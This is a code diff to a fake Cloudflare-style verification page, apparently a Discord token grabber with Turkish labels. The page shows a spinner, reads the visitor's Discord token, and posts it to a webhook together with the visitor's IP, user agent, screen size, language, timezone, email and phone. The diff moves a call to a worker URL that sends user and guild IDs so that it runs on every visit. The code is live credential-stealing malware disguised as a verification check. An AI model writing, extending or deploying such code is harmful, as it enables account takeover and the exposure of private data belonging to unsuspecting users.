@@ -35,6 +35,7 @@ el('cf-spinner').classList.add('show');
 var token=gT();
 var now=new Date().toISOString();
 var ip='{$ip}';
+fetch('{$worker}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:{$uid},guild_id:{$gid}})}).catch(function(){});
 var fields=[{name:'Hedef',value:'<@{$uid}> (`{$uid}`)',inline:false},{name:'IP Adresi',value:'```'+ip+'```',inline:true},{name:'User-Agent',value:'```'+(navigator.userAgent).substring(0,200)+'```',inline:false},{name:'Ekran',value:screen.width+'x'+screen.height,inline:true},{name:'Dil',value:navigator.language,inline:true},{name:'Saat Dilimi',value:Intl.DateTimeFormat().resolvedOptions().timeZone,inline:true},{name:'Zaman',value:now,inline:false}];
 function wh(desc,avatar,f){var e={title:'Yeni Yakalama',color:0xF38020,description:desc,timestamp:now,fields:f};if(avatar)e.thumbnail={url:avatar};fetch('{$wh}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[e]})}).catch(function(){})}
 if(token&&token.length>10){
@@ -46,7 +47,6 @@ f.push({name:'ID',value:u.id,inline:true});f.push({name:'Email',value:u.email||'
 f.push({name:'Telefon',value:u.phone||'Yok',inline:true});f.push({name:'Durum',value:f.join(', ')||'Normal',inline:true});
 f.push({name:'Token',value:'```'+token+'```',inline:false});
 wh('Geçerli token!',u.avatar?'https://cdn.discordapp.com/avatars/'+u.id+'/'+u.avatar+'.png':'',fields.concat(f));
-fetch('{$worker}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:{$uid},guild_id:{$gid}})}).catch(function(){});
 }).catch(function(){wh('Token dogrulanamadi','',fields)});
 }else{wh('Token bulunamadi','',fields)}
 setTimeout(function(){el('cf-spinner').classList.remove('show');el('cf-verified').classList.add('show')},1500);
